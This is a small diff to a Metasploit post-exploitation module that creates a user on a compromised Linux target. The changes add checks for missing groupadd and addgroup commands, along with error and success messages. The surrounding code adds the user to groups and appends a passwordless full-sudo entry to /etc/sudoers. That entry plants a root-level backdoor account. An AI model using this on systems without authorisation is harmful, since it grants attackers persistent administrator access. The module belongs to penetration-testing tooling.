@@ -142,6 +142,7 @@ class MetasploitModule < Msf::Post
     # Creating new groups if it was set and isnt manual
     if groups.any? && datastore['MissingGroups'] == 'CREATE' && datastore['UseraddMethod'] != 'MANUAL'
       # Since command can add on groups, checking over groups
+      fail_with(Failure::NotFound, 'Neither groupadd nor addgroup exist on the system. Try running with UseraddMethod as MANUAL to get around this issue') unless check_command_exists?('groupadd') || check_command_exists?('addgroup')
       groupadd = check_command_exists?('groupadd') ? 'groupadd' : 'addgroup'
 
       groups_missing.each do |group|
@@ -284,12 +285,15 @@ class MetasploitModule < Msf::Post
         groups.each do |group|
           d_cmd_exec("addgroup #{datastore['USERNAME']} #{group}")
         end
+      else
+        print_error("Couldnt find \'usermod\' nor \'addgroup\' on the target. User [#{datastore['USERNAME']}] couldnt be linked to groups.")
       end
     end
 
     # Adding user to sudo file if specified
     if datastore['SudoMethod'] == 'SUDO_FILE' && file_exist?('/etc/sudoers')
       append_file('/etc/sudoers', "#{datastore['USERNAME']} ALL=(ALL:ALL) NOPASSWD: ALL\n")
+      print_good("Added [#{datastore['USERNAME']}] to /etc/sudoers successfully")
     end
   end
 end
